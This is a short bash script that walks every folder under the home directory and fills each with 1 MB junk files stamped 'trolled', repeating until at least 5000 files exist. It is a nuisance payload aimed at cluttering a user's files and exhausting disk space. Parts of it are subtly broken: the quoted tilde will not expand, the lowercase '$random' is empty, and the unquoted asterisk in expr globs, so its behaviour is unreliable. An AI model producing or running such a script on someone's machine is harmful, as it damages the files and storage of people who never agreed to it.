#!/bin/bash

total_filled=0
folders_list="~/"

function make_file {
	touch "$1"
	truncate -s 41 "$1"
	echo -n "trolled" >> "$1"
	truncate -s 1024000 "$1"
	total_filled=$(expr $total_filled + 1)
}

function add_folders {
	for d in $1*/ ; do
		if [ -d $d ] ; then
			folders_list="$folders_list $d"
			add_folders $d
		fi
	done
}

add_folders ~/

while ((total_filled < 5000)) ; do
	for folder in $folders_list ; do
		make_file "$folder$(expr $random * $random)"
	done
done

echo "$total_filled"
